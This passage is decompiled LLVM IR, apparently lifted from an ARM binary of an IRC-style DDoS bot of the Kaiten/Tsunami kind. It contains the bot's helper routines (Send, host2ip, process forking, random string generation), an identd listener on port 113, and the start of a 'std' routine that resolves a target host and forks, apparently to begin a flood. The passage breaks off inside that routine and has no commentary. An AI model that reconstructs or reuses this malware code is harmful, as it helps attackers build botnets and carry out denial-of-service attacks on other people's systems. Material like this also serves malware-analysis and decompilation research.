  %v1_83d4 = call i32 @__GI_toupper(i32 %v3_83cc)
  store i32 %v1_83d4, i32* @r4, align 4
  %v2_83e0 = load i8, i8* %tmp, align 1
  %v3_83e0 = zext i8 %v2_83e0 to i32
  %v1_83e8 = call i32 @__GI_toupper(i32 %v3_83e0)
  %v0_83f0 = load i32, i32* @r4, align 4
  %v9_83f0 = icmp eq i32 %v0_83f0, %v1_83e8
  br i1 %v9_83f0, label %dec_label_pc_83f8, label %dec_label_pc_8434

dec_label_pc_83f8:                                ; preds = %dec_label_pc_83c8
  %v1_83fc = add i32 %tmp9, 1
  %v1_8404 = add i32 %arg2, 1
  %v2_8410 = inttoptr i32 %v1_83fc to i8*
  %v3_8410 = call i32 @strwildmatch(i8* %v2_8410, i32 %v1_8404)
  %v2_8418 = icmp ne i32 %v3_8410, 0
  %.8 = zext i1 %v2_8418 to i32
  br label %dec_label_pc_8434

dec_label_pc_8434:                                ; preds = %dec_label_pc_83f8, %dec_label_pc_83c8
  %storemerge = phi i32 [ 1, %dec_label_pc_83c8 ], [ %.8, %dec_label_pc_83f8 ]
  br label %dec_label_pc_843c

dec_label_pc_843c:                                ; preds = %dec_label_pc_83bc, %dec_label_pc_8364, %dec_label_pc_82f0, %dec_label_pc_8434
  %stack_var_-44.0 = phi i32 [ %storemerge4, %dec_label_pc_8364 ], [ %storemerge3, %dec_label_pc_83bc ], [ %v3_82f4, %dec_label_pc_82f0 ], [ %storemerge, %dec_label_pc_8434 ]
  store i32 %v3_82a8, i32* @r4, align 4
  store i32 %v6_82a8, i32* @fp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 (i32)* @__GI_toupper, { 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder label %dec_label_pc_843c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8364, { 2, 1, 0 }
}

define i32 @Send(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_844c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_844c, i32* @ip, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v3_8454 = load i32, i32* @fp, align 4
  store i32 33884, i32* %stack_var_-16, align 4
  %v2_8458 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8458, i32* @fp, align 4
  %v4_8468 = ptrtoint i32* %stack_var_-8 to i32
  store i32 ptrtoint (i8** @global_var_1d800.280 to i32), i32* @r0, align 4
  %v4_847c = call i32 @vsprintf(i32 ptrtoint (i8** @global_var_1d800.280 to i32), i32 %arg2, i32 %v4_8468)
  %v3_8484 = call i32 @strlen(i8* bitcast (i8** @global_var_1d800.280 to i8*))
  store i32 %v3_8484, i32* @r2, align 4
  %v4_8498 = call i32 @__libc_write(i32 %arg1, i32* bitcast (i8** @global_var_1d800.280 to i32*))
  store i32 %v3_8454, i32* @fp, align 4
  ret i32 %v4_8498

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @host2ip(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_84b4 = load i32, i32* @fp, align 4
  store i32 33980, i32* %stack_var_-4, align 4
  %v2_84b8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_84b8, i32* @fp, align 4
  store i32 %arg2, i32* %stack_var_-28, align 4
  store i32 %arg2, i32* @r0, align 4
  %v1_84cc = call i32 @inet_addr(i32 %arg2)
  store i32 %v1_84cc, i32* @global_var_1dc00.282, align 4
  %v3_84e4 = icmp eq i32 %v1_84cc, -1
  br i1 %v3_84e4, label %dec_label_pc_84ec, label %dec_label_pc_8534

dec_label_pc_84ec:                                ; preds = %entry
  %v3_84ec = load i32, i32* %stack_var_-28, align 4
  %v1_84f0 = call i32 @__GI_gethostbyname(i32 %v3_84ec)
  %v2_8500 = icmp eq i32 %v1_84f0, 0
  br i1 %v2_8500, label %dec_label_pc_8508, label %dec_label_pc_8510

dec_label_pc_8508:                                ; preds = %dec_label_pc_84ec
  %v1_850c = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8510

dec_label_pc_8510:                                ; preds = %dec_label_pc_84ec, %dec_label_pc_8508
  %v1_8514 = add i32 %v1_84f0, 16
  %v2_8514 = inttoptr i32 %v1_8514 to i32*
  %v3_8514 = load i32, i32* %v2_8514, align 4
  %v1_8518 = inttoptr i32 %v3_8514 to i32*
  %v2_8518 = load i32, i32* %v1_8518, align 4
  %v1_8524 = add i32 %v1_84f0, 12
  %v2_8524 = inttoptr i32 %v1_8524 to i32*
  %v3_8524 = load i32, i32* %v2_8524, align 4
  store i32 %v3_8524, i32* @r2, align 4
  %v3_8530 = call i32 @bcopy(i32 %v2_8518, i32 ptrtoint (i32* @global_var_1dc00.282 to i32), i32 %v3_8524)
  %v2_8538.pre = load i32, i32* @global_var_1dc00.282, align 4
  br label %dec_label_pc_8534

dec_label_pc_8534:                                ; preds = %entry, %dec_label_pc_8510
  %v2_8538 = phi i32 [ %v1_84cc, %entry ], [ %v2_8538.pre, %dec_label_pc_8510 ]
  store i32 %v3_84b4, i32* @fp, align 4
  ret i32 %v2_8538

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* @global_var_1dc00.282, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8534, { 1, 0 }
  uselistorder label %dec_label_pc_8510, { 1, 0 }
}

define i32 @mfork(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v1_854c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_854c, i32* @ip, align 4
  %v2_8564 = load i8, i8* bitcast (i8** @global_var_1d7f0.284 to i8*), align 4
  %v7_8568 = icmp eq i8 %v2_8564, 1
  br i1 %v7_8568, label %dec_label_pc_8570, label %dec_label_pc_857c

dec_label_pc_8570:                                ; preds = %entry
  br label %dec_label_pc_8680

dec_label_pc_857c:                                ; preds = %entry
  %v0_857c = call i32 @__libc_fork()
  %v2_858c = icmp eq i32 %v0_857c, 0
  br i1 %v2_858c, label %dec_label_pc_8594, label %dec_label_pc_85a0

dec_label_pc_8594:                                ; preds = %dec_label_pc_857c
  br label %dec_label_pc_8680

dec_label_pc_85a0:                                ; preds = %dec_label_pc_857c
  %v2_85a4 = load i32, i32* @global_var_1d7fc.286, align 4
  %v1_85a8 = add i32 %v2_85a4, 1
  store i32 %v1_85a8, i32* @global_var_1d7fc.286, align 4
  %v3_85bc = mul i32 %v1_85a8, 4
  %v1_85c0 = add i32 %v3_85bc, 4
  %v1_85c8 = call i32 @malloc(i32 %v1_85c0)
  %v2_862412 = load i32, i32* @global_var_1d7fc.286, align 4
  %v9_863014 = icmp eq i32 %v2_862412, 1
  br i1 %v9_863014, label %dec_label_pc_8638, label %dec_label_pc_85e0

dec_label_pc_85e0:                                ; preds = %dec_label_pc_85a0, %dec_label_pc_85e0
  %storemerge116 = phi i32 [ %v1_8618, %dec_label_pc_85e0 ], [ 0, %dec_label_pc_85a0 ]
  %v3_85e4 = mul i32 %storemerge116, 4
  %v2_85f0 = add i32 %v3_85e4, %v1_85c8
  %v2_8604 = load i32, i32* @global_var_1fe74.288, align 4
  %v2_8608 = add i32 %v2_8604, %v3_85e4
  %v1_860c = inttoptr i32 %v2_8608 to i32*
  %v2_860c = load i32, i32* %v1_860c, align 4
  %v2_8610 = inttoptr i32 %v2_85f0 to i32*
  store i32 %v2_860c, i32* %v2_8610, align 4
  %v1_8618 = add i32 %storemerge116, 1
  %v2_8624 = load i32, i32* @global_var_1d7fc.286, align 4
  %v1_8628 = add i32 %v2_8624, -1
  %tmp = icmp ugt i32 %v1_8628, %v1_8618
  br i1 %tmp, label %dec_label_pc_85e0, label %dec_label_pc_8620.dec_label_pc_8638_crit_edge

dec_label_pc_8620.dec_label_pc_8638_crit_edge:    ; preds = %dec_label_pc_85e0
  br label %dec_label_pc_8638

dec_label_pc_8638:                                ; preds = %dec_label_pc_85a0, %dec_label_pc_8620.dec_label_pc_8638_crit_edge
  %v2_8624.lcssa = phi i32 [ %v2_8624, %dec_label_pc_8620.dec_label_pc_8638_crit_edge ], [ %v2_862412, %dec_label_pc_85a0 ]
  %v3_8640 = mul i32 %v2_8624.lcssa, 4
  %v2_864c = add i32 %v1_85c8, -4
  %v1_8650 = add i32 %v2_864c, %v3_8640
  %v2_8658 = inttoptr i32 %v1_8650 to i32*
  store i32 %v0_857c, i32* %v2_8658, align 4
  %v2_8660 = load i32, i32* @global_var_1fe74.288, align 4
  store i32 %v2_8660, i32* @r0, align 4
  %v0_8668 = call i32 @free()
  store i32 %v1_85c8, i32* @global_var_1fe74.288, align 4
  br label %dec_label_pc_8680

dec_label_pc_8680:                                ; preds = %dec_label_pc_8594, %dec_label_pc_8570, %dec_label_pc_8638
  %v3_8680 = phi i32 [ 0, %dec_label_pc_8594 ], [ 1, %dec_label_pc_8570 ], [ %v0_857c, %dec_label_pc_8638 ]
  ret i32 %v3_8680

; uselistorder directives
  uselistorder i32 %v3_85e4, { 1, 0 }
  uselistorder i32 %storemerge116, { 1, 0 }
  uselistorder i32 %v2_862412, { 1, 0 }
  uselistorder i32 %v1_85c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8680, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8638, { 1, 0 }
  uselistorder label %dec_label_pc_85e0, { 1, 0 }
}

define i32 @filter(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i8*, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_869c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_869c, i32* @ip, align 4
  store i8* %arg1, i8** %stack_var_-20, align 4
  br label %dec_label_pc_86d8

dec_label_pc_86b4:                                ; preds = %dec_label_pc_8700, %dec_label_pc_86d8
  %v3_86b4 = phi i8* [ %v3_8710, %dec_label_pc_8700 ], [ %v3_86e8, %dec_label_pc_86d8 ]
  %v3_86b8 = call i32 @strlen(i8* %v3_86b4)
  %v3_86c4 = load i8*, i8** %stack_var_-20, align 4
  %v4_86c4 = ptrtoint i8* %v3_86c4 to i32
  %v2_86c8 = add i32 %v3_86b8, -1
  %v1_86cc = add i32 %v2_86c8, %v4_86c4
  %v3_86d4 = inttoptr i32 %v1_86cc to i8*
  store i8 0, i8* %v3_86d4, align 1
  %v3_86d8.pre = load i8*, i8** %stack_var_-20, align 4
  br label %dec_label_pc_86d8

dec_label_pc_86d8:                                ; preds = %entry, %dec_label_pc_86b4
  %v3_86d8 = phi i8* [ %arg1, %entry ], [ %v3_86d8.pre, %dec_label_pc_86b4 ]
  %v3_86dc = call i32 @strlen(i8* %v3_86d8)
  %v3_86e8 = load i8*, i8** %stack_var_-20, align 4
  %v4_86e8 = ptrtoint i8* %v3_86e8 to i32
  %v2_86ec = add i32 %v3_86dc, -1
  %v1_86f0 = add i32 %v2_86ec, %v4_86e8
  %v1_86f4 = inttoptr i32 %v1_86f0 to i8*
  %v2_86f4 = load i8, i8* %v1_86f4, align 1
  %v7_86f8 = icmp eq i8 %v2_86f4, 13
  br i1 %v7_86f8, label %dec_label_pc_86b4, label %dec_label_pc_8700

dec_label_pc_8700:                                ; preds = %dec_label_pc_86d8
  %v3_8704 = call i32 @strlen(i8* %v3_86e8)
  %v3_8710 = load i8*, i8** %stack_var_-20, align 4
  %v4_8710 = ptrtoint i8* %v3_8710 to i32
  %v2_8714 = add i32 %v3_8704, -1
  %v1_8718 = add i32 %v2_8714, %v4_8710
  %v1_871c = inttoptr i32 %v1_8718 to i8*
  %v2_871c = load i8, i8* %v1_871c, align 1
  %v7_8720 = icmp eq i8 %v2_871c, 10
  br i1 %v7_8720, label %dec_label_pc_86b4, label %dec_label_pc_8728

dec_label_pc_8728:                                ; preds = %dec_label_pc_8700
  ret i32 %v3_8704

; uselistorder directives
  uselistorder i8* %v3_8710, { 1, 0 }
  uselistorder i8* %v3_86e8, { 1, 2, 0 }
  uselistorder i8** %stack_var_-20, { 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_86d8, { 1, 0 }
}

define i32 @makestring(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-1068 = alloca i32, align 4
  %v3_8730 = load i32, i32* @r4, align 4
  %v6_8730 = load i32, i32* @fp, align 4
  %v2_873c = ptrtoint i32* %stack_var_-1068 to i32
  %v0_8740 = call i32 @random()
  %v2_8750 = srem i32 %v0_8740, 5
  %v1_8758 = add nsw i32 %v2_8750, 4
  %v1_8764 = add nsw i32 %v2_8750, 5
  %v1_876c = call i32 @malloc(i32 %v1_8764)
  store i32 %v1_8764, i32* @r2, align 4
  %v2_8790 = inttoptr i32 %v1_876c to i8*
  %v3_8790 = call i32 @__GI_memset(i8* %v2_8790, i32 0)
  store i32 ptrtoint ([16 x i8]* @global_var_1324c.290 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1325c.292 to i32), i32* @r1, align 4
  %v3_879c = call i32 @__GI_fopen(i32 ptrtoint ([16 x i8]* @global_var_1324c.290 to i32), i32 ptrtoint (i32* @global_var_1325c.292 to i32))
  %v2_87ac = icmp eq i32 %v3_879c, 0
  br i1 %v2_87ac, label %dec_label_pc_8804.preheader, label %dec_label_pc_8818

dec_label_pc_8804.preheader:                      ; preds = %entry
  %v5_881022 = icmp sgt i32 %v2_8750, -4
  br i1 %v5_881022, label %dec_label_pc_87c0, label %dec_label_pc_88f4

dec_label_pc_87c0:                                ; preds = %dec_label_pc_8804.preheader, %dec_label_pc_87c0
  %storemerge323 = phi i32 [ %v1_87fc, %dec_label_pc_87c0 ], [ 0, %dec_label_pc_8804.preheader ]
  %v2_87cc = add i32 %storemerge323, %v1_876c
  store i32 %v2_87cc, i32* @r4, align 4
  %v0_87d0 = call i32 @random()
  %v2_87e0 = srem i32 %v0_87d0, 26
  %fold = add nsw i32 %v2_87e0, 65
  %v1_87f4 = trunc i32 %fold to i8
  %v2_87f4 = load i32, i32* @r4, align 4
  %v3_87f4 = inttoptr i32 %v2_87f4 to i8*
  store i8 %v1_87f4, i8* %v3_87f4, align 1
  %v1_87fc = add nuw nsw i32 %storemerge323, 1
  %v5_8810 = icmp slt i32 %v1_87fc, %v1_8758
  br i1 %v5_8810, label %dec_label_pc_87c0, label %dec_label_pc_88f4

dec_label_pc_8818:                                ; preds = %entry
  %v0_8818 = call i32 @random()
  store i32 %v0_8818, i32* @r4, align 4
  %v0_8820 = call i32 @random()
  %v0_8828 = load i32, i32* @r4, align 4
  %v2_8828 = mul i32 %v0_8828, %v0_8820
  %v2_8838 = srem i32 %v2_8828, 45402
  %v5_888430 = icmp slt i32 %v2_8838, 0
  br i1 %v5_888430, label %dec_label_pc_8888, label %dec_label_pc_8854

dec_label_pc_8854:                                ; preds = %dec_label_pc_8818, %dec_label_pc_8854
  %storemerge231 = phi i32 [ %v1_8870, %dec_label_pc_8854 ], [ 0, %dec_label_pc_8818 ]
  %v3_8868 = call i32 @fgets(i32 %v2_873c, i32 1024, i32 %v3_879c)
  %v1_8870 = add nuw nsw i32 %storemerge231, 1
  %v5_8884 = icmp slt i32 %storemerge231, %v2_8838
  br i1 %v5_8884, label %dec_label_pc_8854, label %dec_label_pc_8888

dec_label_pc_8888:                                ; preds = %dec_label_pc_8854, %dec_label_pc_8818
  store i32 1024, i32* @r2, align 4
  %v2_889c = bitcast i32* %stack_var_-1068 to i8*
  %v3_889c = call i32 @__GI_memset(i8* %v2_889c, i32 0)
  %v3_88b4 = call i32 @fgets(i32 %v2_873c, i32 1024, i32 %v3_879c)
  %v2_88c4 = call i32 @filter(i8* %v2_889c)
  store i32 %v1_876c, i32* @r0, align 4
  store i32 %v2_873c, i32* @r1, align 4
  store i32 %v1_8758, i32* @r2, align 4
  %v0_88e8 = call i32 @memcpy()
  %v1_88f0 = inttoptr i32 %v3_879c to i8*
  %v2_88f0 = call i32 @__GI_fclose(i8* %v1_88f0)
  br label %dec_label_pc_88f4

dec_label_pc_88f4:                                ; preds = %dec_label_pc_8804.preheader, %dec_label_pc_87c0, %dec_label_pc_8888
  store i32 %v3_8730, i32* @r4, align 4
  store i32 %v6_8730, i32* @fp, align 4
  ret i32 %v1_876c

; uselistorder directives
  uselistorder i32 %v1_87fc, { 1, 0 }
  uselistorder i32 %v1_876c, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_88f4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8854, { 1, 0 }
  uselistorder label %dec_label_pc_87c0, { 1, 0 }
}

define i32 @identd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-1100 = alloca i32, align 4
  %stack_var_-1108 = alloca i32, align 4
  %stack_var_-1236 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_890c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_890c, i32* @ip, align 4
  %v3_8910 = load i32, i32* @fp, align 4
  store i32 %v3_8910, i32* %stack_var_-16, align 4
  store i32 35096, i32* %stack_var_-4, align 4
  %v13_8910 = ptrtoint i32* %stack_var_-16 to i32
  %v2_8914 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8914, i32* @fp, align 4
  %v0_892c = call i32 @socket()
  %v7_893c = icmp eq i32 %v0_892c, -1
  br i1 %v7_893c, label %dec_label_pc_8cdc, label %dec_label_pc_8944

dec_label_pc_8944:                                ; preds = %entry
  %v1_8958 = call i32 @htons(i32 113)
  %v0_899c = call i32 @bind()
  %v7_89a4 = icmp eq i32 %v0_899c, -1
  br i1 %v7_89a4, label %dec_label_pc_8cdc, label %dec_label_pc_89ac

dec_label_pc_89ac:                                ; preds = %dec_label_pc_8944
  %v0_89b4 = call i32 @listen()
  %v7_89bc = icmp eq i32 %v0_89b4, -1
  br i1 %v7_89bc, label %dec_label_pc_8cdc, label %dec_label_pc_89c4

dec_label_pc_89c4:                                ; preds = %dec_label_pc_89ac
  %v0_89c4 = call i32 @__libc_fork()
  %v2_89cc = icmp eq i32 %v0_89c4, 0
  br i1 %v2_89cc, label %dec_label_pc_8cdc, label %dec_label_pc_89d4

dec_label_pc_89d4:                                ; preds = %dec_label_pc_89c4
  store i32 16, i32* %stack_var_-44, align 4
  %v2_89dc = ptrtoint i32* %stack_var_-76 to i32
  %v2_89e0 = ptrtoint i32* %stack_var_-44 to i32
  %v5_89ec = bitcast i32* %stack_var_-76 to %sockaddr*
  %v6_89ec = call i32 @__libc_accept(i32 %v0_892c, %sockaddr* %v5_89ec, i32 %v2_89e0, i32 %v2_89dc, i32 16)
  %v2_89fc = add i32 %v6_89ec, 1
  %v3_89fc = icmp eq i32 %v6_89ec, -1
  br i1 %v3_89fc, label %dec_label_pc_8a04, label %dec_label_pc_8a0c.preheader

dec_label_pc_8a04:                                ; preds = %dec_label_pc_89d4
  %v1_8a08 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8a0c.preheader

dec_label_pc_8a0c.preheader:                      ; preds = %dec_label_pc_8a04, %dec_label_pc_89d4
  %v2_8a14 = ptrtoint i32* %stack_var_-1236 to i32
  %v3_8a54 = udiv i32 %v6_89ec, 32
  %v3_8a68 = mul nuw nsw i32 %v3_8a54, 4
  %v2_8a70 = add i32 %v3_8a68, %v13_8910
  %v1_8a80 = urem i32 %v6_89ec, 32
  %v6_8a88 = shl i32 1, %v1_8a80
  %v2_8ad8 = ptrtoint i32* %stack_var_-1108 to i32
  %v2_8b24 = add i32 %v2_8a70, -1220
  %v1_8b28 = inttoptr i32 %v2_8b24 to i32*
  br label %dec_label_pc_8a28.lr.ph

dec_label_pc_8a28.lr.ph:                          ; preds = %dec_label_pc_8b08, %dec_label_pc_8a0c.preheader
  br label %dec_label_pc_8a28

dec_label_pc_8a28:                                ; preds = %dec_label_pc_8a28.lr.ph, %dec_label_pc_8a28
  %storemerge26 = phi i32 [ 0, %dec_label_pc_8a28.lr.ph ], [ %v1_8a3c, %dec_label_pc_8a28 ]
  %v5_8a34 = mul nuw nsw i32 %storemerge26, 4
  %v6_8a34 = add i32 %v5_8a34, %v2_8a14
  %v7_8a34 = inttoptr i32 %v6_8a34 to i32*
  store i32 0, i32* %v7_8a34, align 4
  %v1_8a3c = add nuw nsw i32 %storemerge26, 1
  %tmp37 = icmp ult i32 %v1_8a3c, 32
  br i1 %tmp37, label %dec_label_pc_8a28, label %dec_label_pc_8a50

dec_label_pc_8a50:                                ; preds = %dec_label_pc_8a28
  %v2_8a78 = load i32, i32* %v1_8b28, align 4
  %v2_8a8c = or i32 %v2_8a78, %v6_8a88
  store i32 %v2_8a8c, i32* %v1_8b28, align 4
  store i32 60, i32* %stack_var_-1108, align 4
  %v5_8af0 = call i32 @__libc_select(i32 %v2_89fc, i32 %v2_8a14, i32 0, i32 0, i32 %v2_8ad8)
  %v1_8af8 = icmp slt i32 %v5_8af0, 0
  br i1 %v1_8af8, label %dec_label_pc_8b00, label %dec_label_pc_8b08

dec_label_pc_8b00:                                ; preds = %dec_label_pc_8a50
  %v1_8b04 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8b08

dec_label_pc_8b08:                                ; preds = %dec_label_pc_8a50, %dec_label_pc_8b00
  %v2_8b28 = load i32, i32* %v1_8b28, align 4
  %v6_8b341 = lshr i32 %v2_8b28, %v1_8a80
  %v1_8b3c = urem i32 %v6_8b341, 2
  %v2_8b40 = icmp eq i32 %v1_8b3c, 0
  br i1 %v2_8b40, label %dec_label_pc_8a28.lr.ph, label %dec_label_pc_8b4c

dec_label_pc_8b4c:                                ; preds = %dec_label_pc_8b08
  %v2_8b54 = ptrtoint i32* %stack_var_-1100 to i32
  %v5_8b68 = call i32 @__libc_recv(i32 %v6_89ec, i32* nonnull %stack_var_-1100, i32 1024, i32 0)
  %tmp38 = icmp slt i32 %v5_8b68, 1
  br i1 %tmp38, label %dec_label_pc_8b8c, label %dec_label_pc_8b80

dec_label_pc_8b80:                                ; preds = %dec_label_pc_8b4c
  %v7_8b88 = icmp slt i32 %v5_8b68, 20
  br i1 %v7_8b88, label %dec_label_pc_8b94, label %dec_label_pc_8b8c

dec_label_pc_8b8c:                                ; preds = %dec_label_pc_8b80, %dec_label_pc_8b4c
  %v1_8b90 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8b94

dec_label_pc_8b94:                                ; preds = %dec_label_pc_8b80, %dec_label_pc_8b8c
  %v2_8ba4 = add i32 %v13_8910, -1084
  %v2_8ba8 = add i32 %v2_8ba4, %v5_8b68
  %v3_8bb0 = inttoptr i32 %v2_8ba8 to i8*
  store i8 0, i8* %v3_8bb0, align 1
  %v1_8bb8 = add i32 %v13_8910, -1
  %v2_8bc8 = add i32 %v1_8bb8, %v5_8b68
  %v2_8bcc = add i32 %v2_8bc8, -1084
  %v1_8bd0 = inttoptr i32 %v2_8bcc to i8*
  %v2_8bd0 = load i8, i8* %v1_8bd0, align 1
  %v7_8bd4 = icmp eq i8 %v2_8bd0, 10
  br i1 %v7_8bd4, label %dec_label_pc_8c04, label %dec_label_pc_8bdc

dec_label_pc_8bdc:                                ; preds = %dec_label_pc_8b94
  %v2_8bf8 = load i8, i8* %v1_8bd0, align 1
  %v7_8bfc = icmp eq i8 %v2_8bf8, 13
  br i1 %v7_8bfc, label %dec_label_pc_8c04, label %dec_label_pc_8c28

dec_label_pc_8c04:                                ; preds = %dec_label_pc_8bdc, %dec_label_pc_8b94
  store i8 0, i8* %v1_8bd0, align 1
  br label %dec_label_pc_8c28

dec_label_pc_8c28:                                ; preds = %dec_label_pc_8bdc, %dec_label_pc_8c04
  %v1_8c2c = add i32 %v13_8910, -2
  %v2_8c3c = add i32 %v1_8c2c, %v5_8b68
  %v2_8c40 = add i32 %v2_8c3c, -1084
  %v1_8c44 = inttoptr i32 %v2_8c40 to i8*
  %v2_8c44 = load i8, i8* %v1_8c44, align 1
  %v7_8c48 = icmp eq i8 %v2_8c44, 10
  br i1 %v7_8c48, label %dec_label_pc_8c78, label %dec_label_pc_8c50

dec_label_pc_8c50:                                ; preds = %dec_label_pc_8c28
  %v2_8c6c = load i8, i8* %v1_8c44, align 1
  %v7_8c70 = icmp eq i8 %v2_8c6c, 13
  br i1 %v7_8c70, label %dec_label_pc_8c78, label %dec_label_pc_8c9c

dec_label_pc_8c78:                                ; preds = %dec_label_pc_8c50, %dec_label_pc_8c28
  store i8 0, i8* %v1_8c44, align 1
  br label %dec_label_pc_8c9c

dec_label_pc_8c9c:                                ; preds = %dec_label_pc_8c50, %dec_label_pc_8c78
  %v4_8cc0 = call i32 @Send(i32 %v6_89ec, i32 ptrtoint ([25 x i8]* @global_var_13260.296 to i32), i32 %v2_8b54)
  %v1_8cc8 = call i32 @__libc_close(i32 %v6_89ec)
  %v1_8cd0 = call i32 @__libc_close(i32 %v0_892c)
  %v1_8cd8 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8cdc

dec_label_pc_8cdc:                                ; preds = %dec_label_pc_89c4, %dec_label_pc_89ac, %dec_label_pc_8944, %entry, %dec_label_pc_8c9c
  %v9_8ce0 = phi i32 [ 0, %dec_label_pc_89c4 ], [ %v0_89b4, %dec_label_pc_89ac ], [ %v0_899c, %dec_label_pc_8944 ], [ %v0_892c, %entry ], [ %v1_8cd8, %dec_label_pc_8c9c ]
  ret i32 %v9_8ce0

; uselistorder directives
  uselistorder i8* %v1_8c44, { 1, 0, 2 }
  uselistorder i8* %v1_8bd0, { 1, 0, 2 }
  uselistorder i32 %storemerge26, { 1, 0 }
  uselistorder i32* %v1_8b28, { 2, 0, 1 }
  uselistorder i32 %v1_8a80, { 1, 0 }
  uselistorder i32 %v2_8a14, { 1, 0 }
  uselistorder i32 %v6_89ec, { 2, 3, 4, 1, 0, 6, 5 }
  uselistorder i32 %v0_89b4, { 1, 0 }
  uselistorder i32 %v0_899c, { 1, 0 }
  uselistorder i32 %v0_892c, { 1, 2, 3, 0 }
  uselistorder i32 %v13_8910, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32 -1084, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8cdc, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8c9c, { 1, 0 }
  uselistorder label %dec_label_pc_8c28, { 1, 0 }
  uselistorder label %dec_label_pc_8b94, { 1, 0 }
  uselistorder label %dec_label_pc_8b08, { 1, 0 }
  uselistorder label %dec_label_pc_8a28, { 1, 0 }
}

define i32 @std(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8cec = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8cec, i32* @ip, align 4
  store i32 36088, i32* %stack_var_-4, align 4
  %v2_8cf4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8cf4, i32* @fp, align 4
  store i32 %arg4, i32* %stack_var_-68, align 4
  %v8_8d14 = icmp sgt i32 %arg3, 2
  br i1 %v8_8d14, label %dec_label_pc_8d20, label %dec_label_pc_8d18

dec_label_pc_8d18:                                ; preds = %entry
  %v1_8d1c = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_8d20

dec_label_pc_8d20:                                ; preds = %entry, %dec_label_pc_8d18
  %v0_8d2c = call i32 @socket()
  %v2_8d3c = call i32 @__GI_time(i32* null)
  %v3_8d48 = load i32, i32* %stack_var_-68, align 4
  %v1_8d4c = add i32 %v3_8d48, 12
  %v1_8d50 = inttoptr i32 %v1_8d4c to i32*
  %v2_8d50 = load i32, i32* %v1_8d50, align 4
  store i32 %v2_8d50, i32* @r0, align 4
  %v1_8d58 = call i32 @atol(i32 %v2_8d50)
  %v1_8d68 = call i32 @mfork(i32 %arg2)
  %v2_8d70 = icmp eq i32 %v1_8d68, 0
  br i1 %v2_8d70, label %dec_label_pc_8d78, label %dec_label_pc_8ea4

dec_label_pc_8d78:                                ; preds = %dec_label_pc_8d20
  %v3_8d78 = load i32, i32* %stack_var_-68, align 4
  %v1_8d7c = add i32 %v3_8d78, 4
  %v1_8d80 = inttoptr i32 %v1_8d7c to i32*
  %v2_8d80 = load i32, i32* %v1_8d80, align 4
  %v1_8d88 = call i32 @__GI_gethostbyname(i32 %v2_8d80)
  store i32 16, i32* @r2, align 4
  %v2_8da4 = bitcast i32* %stack_var_-52 to i8*
  %v3_8da4 = call i32 @__GI_memset(i8* %v2_8da4, i32 0)
  %v1_8dac = add i32 %v1_8d88, 16
  %v2_8dac = inttoptr i32 %v1_8dac to i32*
  %v3_8dac = load i32, i32* %v2_8dac, align 4
  %v1_8db0 = inttoptr i32 %v3_8dac to i32*
  %v2_8db0 = load i32, i32* %v1_8db0, align 4
  %v2_8db8 = ptrtoint i32* %stack_var_-48 to i32
  %v1_8dc0 = add i32 %v1_8d88, 12
  %v2_8dc0 = inttoptr i32 %v1_8dc0 to i32*
  %v3_8dc0 = load i32, i32* %v2_8dc0, align 4
